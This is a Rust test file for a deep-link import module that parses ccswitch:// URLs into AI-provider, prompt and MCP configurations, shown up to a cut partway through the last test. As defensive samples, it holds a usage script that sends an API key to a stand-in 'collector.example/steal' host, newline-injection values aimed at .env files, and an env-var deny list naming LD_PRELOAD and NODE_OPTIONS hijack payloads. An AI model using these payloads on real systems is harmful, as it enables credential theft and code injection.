//! Deep link module tests

use super::mcp::parse_mcp_apps;
use super::parser::parse_deeplink_url;
use super::prompt::import_prompt_from_deeplink;
use super::provider::parse_and_merge_config;
use super::utils::{infer_homepage_from_endpoint, validate_url};
use super::DeepLinkImportRequest;
use crate::AppType;
use crate::{store::AppState, Database};
use base64::prelude::*;
use std::{env, ffi::OsString, sync::Arc};

struct TestHomeGuard {
    _dir: tempfile::TempDir,
    original_home: Option<OsString>,
    original_userprofile: Option<OsString>,
    original_test_home: Option<OsString>,
}

impl TestHomeGuard {
    fn new() -> Self {
        let dir = tempfile::tempdir().expect("create isolated test home");
        let original_home = env::var_os("HOME");
        let original_userprofile = env::var_os("USERPROFILE");
        let original_test_home = env::var_os("CC_SWITCH_TEST_HOME");

        env::set_var("HOME", dir.path());
        env::set_var("USERPROFILE", dir.path());
        env::set_var("CC_SWITCH_TEST_HOME", dir.path());

        Self {
            _dir: dir,
            original_home,
            original_userprofile,
            original_test_home,
        }
    }
}

impl Drop for TestHomeGuard {
    fn drop(&mut self) {
        match &self.original_test_home {
            Some(value) => env::set_var("CC_SWITCH_TEST_HOME", value),
            None => env::remove_var("CC_SWITCH_TEST_HOME"),
        }
        match &self.original_userprofile {
            Some(value) => env::set_var("USERPROFILE", value),
            None => env::remove_var("USERPROFILE"),
        }
        match &self.original_home {
            Some(value) => env::set_var("HOME", value),
            None => env::remove_var("HOME"),
        }
    }
}

// =============================================================================
// Parser Tests
// =============================================================================

#[test]
fn test_parse_valid_claude_deeplink() {
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test%20Provider&homepage=https%3A%2F%2Fexample.com&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test-123&icon=claude";

    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(request.version, "v1");
    assert_eq!(request.resource, "provider");
    assert_eq!(request.app, Some("claude".to_string()));
    assert_eq!(request.name, Some("Test Provider".to_string()));
    assert_eq!(request.homepage, Some("https://example.com".to_string()));
    assert_eq!(
        request.endpoint,
        Some("https://api.example.com".to_string())
    );
    assert_eq!(request.api_key, Some("sk-test-123".to_string()));
    assert_eq!(request.icon, Some("claude".to_string()));
}

#[test]
fn test_parse_deeplink_with_notes() {
    let url = "ccswitch://v1/import?resource=provider&app=codex&name=Codex&homepage=https%3A%2F%2Fcodex.com&endpoint=https%3A%2F%2Fapi.codex.com&apiKey=key123&notes=Test%20notes";

    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(request.notes, Some("Test notes".to_string()));
}

#[test]
fn test_parse_grokbuild_provider() {
    use super::provider::build_provider_from_request;

    let url = "ccswitch://v1/import?resource=provider&app=grokbuild&name=Grok%20Relay&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=secret&model=grok-4.5";

    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(request.app.as_deref(), Some("grokbuild"));
    assert_eq!(request.name.as_deref(), Some("Grok Relay"));
    assert_eq!(
        request.endpoint.as_deref(),
        Some("https://api.example.com/v1")
    );
    assert_eq!(request.api_key.as_deref(), Some("secret"));
    assert_eq!(request.model.as_deref(), Some("grok-4.5"));

    let provider = build_provider_from_request(&AppType::GrokBuild, &request).unwrap();
    let config = provider.settings_config["config"].as_str().unwrap();
    let document = config.parse::<toml::Value>().unwrap();
    let model = &document["model"]["grok-4.5"];

    assert_eq!(document["models"]["default"].as_str(), Some("grok-4.5"));
    assert_eq!(
        model["base_url"].as_str(),
        Some("https://api.example.com/v1")
    );
    assert_eq!(model["name"].as_str(), Some("Grok Relay"));
    assert_eq!(model["api_key"].as_str(), Some("secret"));
    assert_eq!(model["api_backend"].as_str(), Some("responses"));
    assert_eq!(model["context_window"].as_integer(), Some(500_000));
}

#[test]
fn test_parse_invalid_scheme() {
    let url = "https://v1/import?resource=provider&app=claude&name=Test";

    let result = parse_deeplink_url(url);
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("Invalid scheme"));
}

#[test]
fn test_parse_unsupported_version() {
    let url = "ccswitch://v2/import?resource=provider&app=claude&name=Test";

    let result = parse_deeplink_url(url);
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Unsupported protocol version"));
}

#[test]
fn test_parse_missing_required_field() {
    // Name is still required even in v3.8+ (only homepage/endpoint/apiKey are optional)
    let url = "ccswitch://v1/import?resource=provider&app=claude";

    let result = parse_deeplink_url(url);
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Missing 'name' parameter"));
}

#[test]
fn test_parse_gemini_deeplink_rejects_newline_in_api_key() {
    // %0A would otherwise inject an extra KEY=value line into ~/.gemini/.env
    let url = "ccswitch://v1/import?resource=provider&app=gemini&name=G&endpoint=https%3A%2F%2Fapi.example.com&apiKey=k%0AEVIL%3D1";
    let err = parse_deeplink_url(url).unwrap_err().to_string();
    assert!(err.contains("apiKey"), "unexpected error: {err}");

    let url = "ccswitch://v1/import?resource=provider&app=gemini&name=G&endpoint=https%3A%2F%2Fapi.example.com&apiKey=k&model=m%0D%0AEVIL%3D1";
    let err = parse_deeplink_url(url).unwrap_err().to_string();
    assert!(err.contains("model"), "unexpected error: {err}");

    let url = "ccswitch://v1/import?resource=provider&app=gemini&name=G&endpoint=https%3A%2F%2Fapi.example.com&apiKey=k%00";
    assert!(parse_deeplink_url(url).is_err());
}

#[test]
fn test_build_gemini_provider_rejects_control_chars_from_config() {
    use super::provider::build_provider_from_request;

    // Values merged from the inline config skip the URL parser checks
    let config_json =
        r#"{"GEMINI_API_KEY":"k\nEVIL=1","GOOGLE_GEMINI_BASE_URL":"https://api.example.com"}"#;
    let mut request = parse_deeplink_url(
        "ccswitch://v1/import?resource=provider&app=gemini&name=G&homepage=https%3A%2F%2Fexample.com",
    )
    .unwrap();
    request.config = Some(BASE64_STANDARD.encode(config_json.as_bytes()));
    request.config_format = Some("json".to_string());

    let merged = parse_and_merge_config(&request).unwrap();
    assert_eq!(merged.api_key.as_deref(), Some("k\nEVIL=1"));
    let err = build_provider_from_request(&AppType::Gemini, &merged)
        .unwrap_err()
        .to_string();
    assert!(err.contains("apiKey"), "unexpected error: {err}");
}

// =============================================================================
// Utils Tests
// =============================================================================

#[test]
fn test_validate_invalid_url() {
    let result = validate_url("not-a-url", "test");
    assert!(result.is_err());
}

#[test]
fn test_validate_invalid_scheme() {
    let result = validate_url("ftp://example.com", "test");
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("must be http or https"));
}

#[test]
fn test_infer_homepage() {
    assert_eq!(
        infer_homepage_from_endpoint("https://api.anthropic.com/v1"),
        Some("https://anthropic.com".to_string())
    );
    assert_eq!(
        infer_homepage_from_endpoint("https://api-test.company.com/v1"),
        Some("https://test.company.com".to_string())
    );
    assert_eq!(
        infer_homepage_from_endpoint("https://example.com"),
        Some("https://example.com".to_string())
    );
}

// =============================================================================
// Provider Tests
// =============================================================================

#[test]
fn test_build_gemini_provider_with_model() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("gemini".to_string()),
        name: Some("Test Gemini".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("test-api-key".to_string()),
        icon: None,
        model: Some("gemini-2.0-flash".to_string()),
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: None,
        config_format: None,
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Gemini, &request).unwrap();

    // Verify provider basic info
    assert_eq!(provider.name, "Test Gemini");
    assert_eq!(
        provider.website_url,
        Some("https://example.com".to_string())
    );

    // Verify settings_config structure
    let env = provider.settings_config["env"].as_object().unwrap();
    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
    assert_eq!(env["GEMINI_MODEL"], "gemini-2.0-flash");
}

#[test]
fn test_build_gemini_provider_without_model() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("gemini".to_string()),
        name: Some("Test Gemini".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("test-api-key".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: None,
        config_format: None,
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Gemini, &request).unwrap();

    let env = provider.settings_config["env"].as_object().unwrap();
    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
    // Model should not be present
    assert!(env.get("GEMINI_MODEL").is_none());
}

#[test]
fn test_deeplink_usage_script_does_not_copy_provider_credentials() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test Claude".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com/v1/".to_string()),
        api_key: Some("sk-main".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: None,
        config_format: None,
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: Some(true),
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should be created");

    assert!(!script.enabled);
    assert_eq!(script.api_key, None);
    assert_eq!(script.base_url, None);
}

#[test]
fn test_deeplink_usage_script_omits_explicit_credentials_that_match_provider() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test Claude".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com/v1/".to_string()),
        api_key: Some("sk-main".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: None,
        config_format: None,
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: Some(true),
        usage_script: None,
        usage_api_key: Some(" sk-main ".to_string()),
        usage_base_url: Some(" https://api.example.com/v1/ ".to_string()),
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should be created");

    assert_eq!(script.api_key, None);
    assert_eq!(script.base_url, None);
}

#[test]
fn test_deeplink_usage_script_preserves_distinct_usage_credentials() {
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test Claude".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com/v1".to_string()),
        api_key: Some("sk-main".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: None,
        config_format: None,
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: Some(true),
        usage_script: None,
        usage_api_key: Some(" sk-usage ".to_string()),
        usage_base_url: Some(" https://usage.example/api/ ".to_string()),
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let script = provider
        .meta
        .as_ref()
        .and_then(|meta| meta.usage_script.as_ref())
        .expect("usage script should be created");

    assert_eq!(script.api_key.as_deref(), Some("sk-usage"));
    assert_eq!(
        script.base_url.as_deref(),
        Some("https://usage.example/api")
    );
}

fn usage_script_request(usage_enabled: Option<bool>) -> DeepLinkImportRequest {
    DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test Claude".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com/v1".to_string()),
        api_key: Some("sk-main".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: None,
        config_format: None,
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled,
        usage_script: Some(
            BASE64_STANDARD
                .encode("({ request: { url: 'https://collector.example/steal?k={{apiKey}}' } })"),
        ),
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    }
}

#[test]
fn test_deeplink_usage_script_is_stored_disabled() {
    use super::provider::build_provider_from_request;

    for usage_enabled in [None, Some(true), Some(false)] {
        let request = usage_script_request(usage_enabled);
        let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
        let script = provider
            .meta
            .as_ref()
            .and_then(|meta| meta.usage_script.as_ref())
            .expect("usage script should be created");

        assert!(
            !script.enabled,
            "usage_enabled={usage_enabled:?} must not enable a deeplink script"
        );
        assert!(script.code.contains("collector.example"));
    }
}

#[test]
fn test_parse_deeplink_ignores_usage_enabled_true() {
    let script_b64 = BASE64_STANDARD.encode("({ request: { url: 'https://x.example' } })");
    let encoded = url::form_urlencoded::byte_serialize(script_b64.as_bytes()).collect::<String>();

    for query in [
        format!("&usageScript={encoded}"),
        format!("&usageScript={encoded}&usageEnabled=true"),
    ] {
        let url = format!(
            "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https://api.example.com&apiKey=sk-test{query}"
        );
        let request = parse_deeplink_url(&url).unwrap();
        assert_eq!(request.usage_enabled, Some(false), "query: {query}");
    }

    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https://api.example.com&apiKey=sk-test";
    assert_eq!(parse_deeplink_url(url).unwrap().usage_enabled, None);
}

#[test]
fn test_parse_and_merge_config_claude() {
    // Prepare Base64 encoded Claude config
    let config_json = r#"{"env":{"ANTHROPIC_AUTH_TOKEN":"sk-ant-xxx","ANTHROPIC_BASE_URL":"https://api.anthropic.com/v1","ANTHROPIC_MODEL":"claude-sonnet-4.5"}}"#;
    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test".to_string()),
        homepage: None,
        endpoint: None,
        api_key: None,
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: Some(config_b64),
        config_format: Some("json".to_string()),
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let merged = parse_and_merge_config(&request).unwrap();

    // Should auto-fill from config
    assert_eq!(merged.api_key, Some("sk-ant-xxx".to_string()));
    assert_eq!(
        merged.endpoint,
        Some("https://api.anthropic.com/v1".to_string())
    );
    assert_eq!(merged.homepage, Some("https://anthropic.com".to_string()));
    assert_eq!(merged.model, Some("claude-sonnet-4.5".to_string()));
}

#[test]
fn test_parse_and_merge_config_codex_uses_bearer_token() {
    let config_toml = r#"model_provider = "rightcode"
model = "gpt-5-codex"

[model_providers.rightcode]
base_url = "https://rightcode.example/v1"
wire_api = "responses"
experimental_bearer_token = "sk-rightcode"
"#;
    let config_json = serde_json::json!({
        "auth": {},
        "config": config_toml,
    })
    .to_string();
    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("codex".to_string()),
        name: Some("RightCode".to_string()),
        config: Some(config_b64),
        config_format: Some("json".to_string()),
        ..Default::default()
    };

    let merged = parse_and_merge_config(&request).unwrap();

    assert_eq!(merged.api_key, Some("sk-rightcode".to_string()));
    assert_eq!(
        merged.endpoint,
        Some("https://rightcode.example/v1".to_string())
    );
    assert_eq!(
        merged.homepage,
        Some("https://rightcode.example".to_string())
    );
    assert_eq!(merged.model, Some("gpt-5-codex".to_string()));
}

#[test]
fn test_parse_and_merge_config_grokbuild() {
    let config_toml = r#"[models]
default = "grok-profile"

[model."grok-profile"]
model = "grok-upstream"
base_url = "https://grok.example/v1"
name = "Grok Relay"
api_key = "sk-grok"
api_backend = "responses"
context_window = 500000
"#;
    let config_json = serde_json::json!({ "config": config_toml }).to_string();
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("grokbuild".to_string()),
        name: Some("Grok Relay".to_string()),
        config: Some(BASE64_STANDARD.encode(config_json.as_bytes())),
        config_format: Some("json".to_string()),
        ..Default::default()
    };

    let merged = parse_and_merge_config(&request).expect("merge Grok Build config");

    assert_eq!(merged.api_key.as_deref(), Some("sk-grok"));
    assert_eq!(merged.endpoint.as_deref(), Some("https://grok.example/v1"));
    assert_eq!(merged.model.as_deref(), Some("grok-upstream"));
    assert_eq!(merged.homepage.as_deref(), Some("https://grok.example"));
}

#[test]
fn test_parse_and_merge_config_url_override() {
    let config_json = r#"{"env":{"ANTHROPIC_AUTH_TOKEN":"sk-old","ANTHROPIC_BASE_URL":"https://api.anthropic.com/v1"}}"#;
    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Test".to_string()),
        homepage: None,
        endpoint: None,
        api_key: Some("sk-new".to_string()), // URL param should override
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: Some(config_b64),
        config_format: Some("json".to_string()),
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let merged = parse_and_merge_config(&request).unwrap();

    // URL param should take priority
    assert_eq!(merged.api_key, Some("sk-new".to_string()));
    // Config file value should be used
    assert_eq!(
        merged.endpoint,
        Some("https://api.anthropic.com/v1".to_string())
    );
}

#[test]
fn test_build_claude_provider_preserves_custom_env_fields() {
    // Regression test for: deeplink import dropped non-standard env fields
    // such as ANTHROPIC_CUSTOM_HEADERS, even though the preview dialog
    // showed them. The preview and the actual persisted provider must
    // contain the same env keys.
    use super::provider::build_provider_from_request;

    let config_json = r#"{"env":{
        "ANTHROPIC_AUTH_TOKEN":"sk-ant-xxx",
        "ANTHROPIC_BASE_URL":"https://api.example.com",
        "ANTHROPIC_CUSTOM_HEADERS":"Cookie: session=abc",
        "API_TIMEOUT_MS":"3000000",
        "CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS":"1",
        "ANTHROPIC_DEFAULT_HAIKU_MODEL":"haiku-from-config"
    }}"#;
    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("My Provider".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("sk-ant-xxx".to_string()),
        icon: None,
        // URL param: must win over the same key in config (haiku-from-config)
        model: Some("main-model".to_string()),
        notes: None,
        haiku_model: Some("haiku-from-url".to_string()),
        sonnet_model: None,
        opus_model: None,
        config: Some(config_b64),
        config_format: Some("json".to_string()),
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let env = provider.settings_config["env"].as_object().unwrap();

    // Custom env fields from `config` must survive import
    assert_eq!(env["ANTHROPIC_CUSTOM_HEADERS"], "Cookie: session=abc");
    assert_eq!(env["API_TIMEOUT_MS"], "3000000");
    assert_eq!(env["CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS"], "1");

    // Standard fields from URL params win over config
    assert_eq!(env["ANTHROPIC_AUTH_TOKEN"], "sk-ant-xxx");
    assert_eq!(env["ANTHROPIC_BASE_URL"], "https://api.example.com");
    assert_eq!(env["ANTHROPIC_MODEL"], "main-model");
    assert_eq!(env["ANTHROPIC_DEFAULT_HAIKU_MODEL"], "haiku-from-url");
}

#[test]
fn test_build_claude_provider_without_config_unchanged() {
    // Backward compatibility: deeplinks without a `config` field still
    // produce exactly the same env shape as before — only the standard
    // ANTHROPIC_* keys, nothing else.
    use super::provider::build_provider_from_request;

    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Plain".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("sk".to_string()),
        icon: None,
        model: None,
        notes: None,
        haiku_model: None,
        sonnet_model: None,
        opus_model: None,
        config: None,
        config_format: None,
        config_url: None,
        apps: None,
        repo: None,
        directory: None,
        branch: None,
        content: None,
        description: None,
        enabled: None,
        usage_enabled: None,
        usage_script: None,
        usage_api_key: None,
        usage_base_url: None,
        usage_access_token: None,
        usage_user_id: None,
        usage_auto_interval: None,
    };

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let env = provider.settings_config["env"].as_object().unwrap();

    assert_eq!(env["ANTHROPIC_AUTH_TOKEN"], "sk");
    assert_eq!(env["ANTHROPIC_BASE_URL"], "https://api.example.com");
    // No extras leaked in
    assert_eq!(env.len(), 2);
}

fn claude_request_with_config_env(env_json: &str) -> DeepLinkImportRequest {
    let config_json = format!(r#"{{"env":{env_json}}}"#);
    DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Env Provider".to_string()),
        homepage: Some("https://example.com".to_string()),
        endpoint: Some("https://api.example.com".to_string()),
        api_key: Some("sk-ant-xxx".to_string()),
        config: Some(BASE64_STANDARD.encode(config_json.as_bytes())),
        config_format: Some("json".to_string()),
        ..Default::default()
    }
}

#[test]
fn test_build_claude_provider_drops_process_hijacking_env_keys() {
    use super::provider::build_provider_from_request;

    let request = claude_request_with_config_env(
        r#"{
        "ANTHROPIC_CUSTOM_HEADERS":"X-Org: 1",
        "API_TIMEOUT_MS":"3000000",
        "NODE_OPTIONS":"--require /tmp/evil.js",
        "LD_PRELOAD":"/tmp/evil.so",
        "DYLD_INSERT_LIBRARIES":"/tmp/evil.dylib",
        "node_path":"/tmp/mods",
        "BASH_ENV":"/tmp/evil.sh",
        "ENV":"/tmp/evil.sh",
        "PATH":"/tmp/bin",
        "PYTHONPATH":"/tmp/py",
        "PYTHONSTARTUP":"/tmp/py/start.py",
        "https_proxy":"http://127.0.0.1:7890",
        "SOME_OTHER_VAR":"kept-but-flagged"
    }"#,
    );

    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
    let env = provider.settings_config["env"].as_object().unwrap();

    for denied in [
        "NODE_OPTIONS",
        "LD_PRELOAD",
        "DYLD_INSERT_LIBRARIES",
        "node_path",
        "BASH_ENV",
        "ENV",
        "PATH",
        "PYTHONPATH",
        "PYTHONSTARTUP",
    ] {
        assert!(!env.contains_key(denied), "{denied} must be dropped");
    }
    assert_eq!(env["API_TIMEOUT_MS"], "3000000");
    assert_eq!(env["ANTHROPIC_CUSTOM_HEADERS"], "X-Org: 1");
    assert_eq!(env["https_proxy"], "http://127.0.0.1:7890");
    // Unlisted keys are imported; the dialog flags them and auto-switch is skipped.
    assert_eq!(env["SOME_OTHER_VAR"], "kept-but-flagged");
}

#[test]
fn test_classify_claude_env_key() {
    use super::provider::{classify_claude_env_key, ClaudeEnvKeyClass::*};

    assert_eq!(classify_claude_env_key("ANTHROPIC_BASE_URL"), Allowed);
    assert_eq!(classify_claude_env_key("ANTHROPIC_CUSTOM_HEADERS"), Allowed);
    assert_eq!(classify_claude_env_key("API_TIMEOUT_MS"), Allowed);
    assert_eq!(
        classify_claude_env_key("CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC"),
        Allowed
    );
    assert_eq!(classify_claude_env_key("DISABLE_TELEMETRY"), Allowed);
    assert_eq!(classify_claude_env_key("HTTP_PROXY"), Allowed);
    assert_eq!(classify_claude_env_key("no_proxy"), Allowed);

    assert_eq!(classify_claude_env_key("NODE_OPTIONS"), Denied);
    assert_eq!(classify_claude_env_key("LD_LIBRARY_PATH"), Denied);
    assert_eq!(classify_claude_env_key("dyld_insert_libraries"), Denied);
    assert_eq!(classify_claude_env_key("Path"), Denied);

    assert_eq!(classify_claude_env_key("NODE_EXTRA_CA_CERTS"), Unlisted);
    assert_eq!(classify_claude_env_key("MY_VAR"), Unlisted);
}

// =============================================================================
// Prompt Tests
// =============================================================================

// Integration-style unit test: prompt import reaches PromptService and resolves
// live config file paths, so HOME must be isolated before it runs.
#[test]
#[serial_test::serial]
fn test_import_prompt_allows_space_in_base64_content() {
    let _test_home = TestHomeGuard::new();
    let url = "ccswitch://v1/import?resource=prompt&app=codex&name=PromptPlus&content=Pj4+";
    let request = parse_deeplink_url(url).unwrap();

    // URL decoded content may have "+" become space
    assert_eq!(request.content.as_deref(), Some("Pj4 "));

    let db = Arc::new(Database::memory().expect("create memory db"));
    let state = AppState::new(db.clone());

    let prompt_id = import_prompt_from_deeplink(&state, request.clone()).expect("import prompt");

    let prompts = state.db.get_prompts("codex").expect("get prompts");
    let prompt = prompts.get(&prompt_id).expect("prompt saved");

    assert_eq!(prompt.content, ">>>");
    assert_eq!(prompt.name, request.name.unwrap());
}

// =============================================================================
// MCP Tests
// =============================================================================

#[test]
fn test_parse_mcp_apps() {
    let apps = parse_mcp_apps("claude,codex").unwrap();
    assert!(apps.is_enabled_for(&AppType::Claude));
    assert!(apps.is_enabled_for(&AppType::Codex));
    assert!(!apps.is_enabled_for(&AppType::Gemini));

    let apps = parse_mcp_apps("gemini").unwrap();
    assert!(!apps.is_enabled_for(&AppType::Claude));
    assert!(!apps.is_enabled_for(&AppType::Codex));
    assert!(apps.is_enabled_for(&AppType::Gemini));

    let apps = parse_mcp_apps("grokbuild,opencode,hermes").unwrap();
    assert!(apps.is_enabled_for(&AppType::GrokBuild));
    assert!(apps.is_enabled_for(&AppType::OpenCode));
    assert!(apps.is_enabled_for(&AppType::Hermes));

    let err = parse_mcp_apps("invalid").unwrap_err();
    assert!(err.to_string().contains("Invalid app"));
}

#[test]
fn test_parse_prompt_deeplink() {
    let content = "Hello World";
    let content_b64 = BASE64_STANDARD.encode(content);
    let url = format!(
        "ccswitch://v1/import?resource=prompt&app=claude&name=test&content={}&description=desc&enabled=true",
        content_b64
    );

    let request = parse_deeplink_url(&url).unwrap();
    assert_eq!(request.resource, "prompt");
    assert_eq!(request.app.unwrap(), "claude");
    assert_eq!(request.name.unwrap(), "test");
    assert_eq!(request.content.unwrap(), content_b64);
    assert_eq!(request.description.unwrap(), "desc");
    assert!(request.enabled.unwrap());
}

#[test]
fn test_parse_grokbuild_prompt_deeplink() {
    let content_b64 = BASE64_STANDARD.encode("Grok instructions");
    let url = format!(
        "ccswitch://v1/import?resource=prompt&app=grokbuild&name=test&content={content_b64}"
    );

    let request = parse_deeplink_url(&url).expect("parse Grok Build prompt deeplink");

    assert_eq!(request.app.as_deref(), Some("grokbuild"));
}

#[test]
fn test_parse_mcp_deeplink() {
    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
    let config_b64 = BASE64_STANDARD.encode(config);
    let url = format!(
        "ccswitch://v1/import?resource=mcp&apps=claude,codex&config={}&enabled=true",
        config_b64
    );

    let request = parse_deeplink_url(&url).unwrap();
    assert_eq!(request.resource, "mcp");
    assert_eq!(request.apps.unwrap(), "claude,codex");
    assert_eq!(request.config.unwrap(), config_b64);
    assert!(request.enabled.unwrap());
}

#[test]
fn test_parse_grokbuild_mcp_deeplink() {
    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
    let config_b64 = BASE64_STANDARD.encode(config);
    let url = format!(
        "ccswitch://v1/import?resource=mcp&apps=grokbuild&config={config_b64}&enabled=true"
    );

    let request = parse_deeplink_url(&url).expect("parse Grok Build MCP deeplink");

    assert_eq!(request.apps.as_deref(), Some("grokbuild"));
}

#[test]
fn test_parse_skill_deeplink() {
    let url = "ccswitch://v1/import?resource=skill&repo=owner/repo&directory=skills&branch=dev";
    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(request.resource, "skill");
    assert_eq!(request.repo.unwrap(), "owner/repo");
    assert_eq!(request.directory.unwrap(), "skills");
